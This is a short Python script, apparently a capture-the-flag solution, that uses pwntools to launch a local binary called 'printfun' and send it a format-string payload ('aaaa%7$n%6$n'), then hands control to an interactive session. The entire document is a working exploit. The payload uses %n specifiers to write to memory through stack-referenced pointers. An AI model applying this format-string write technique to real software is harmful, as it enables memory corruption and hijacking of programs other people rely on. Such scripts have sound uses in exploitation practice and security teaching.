from pwn import *

app = process('./printfun')

payload = "aaaa%7$n%6$n"

app.sendlineafter("? ", payload)
app.interactive()